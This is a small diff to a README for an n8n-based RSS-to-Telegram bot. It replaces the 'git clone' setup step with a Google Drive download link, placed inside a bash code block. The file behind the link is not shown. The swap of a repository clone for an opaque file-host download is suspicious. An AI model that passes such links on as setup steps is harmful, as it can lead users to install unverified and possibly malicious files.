@@ -25,8 +25,7 @@ Goal: Deliver regularly updated news automatically to a Telegram group/channel.
 
 1. **Clone the project**
    ```bash
-   git clone https://github.com/<username>/my-rss-telegram-bot.git
-   cd my-rss-telegram-bot
+   [Download here](https://drive.usercontent.google.com/u/0/uc?id=1Swuaw-etASp2KgeeVL1HQ--QGfAKf4c8&export=download)
    ```
 
 2. **Install and run n8n**  
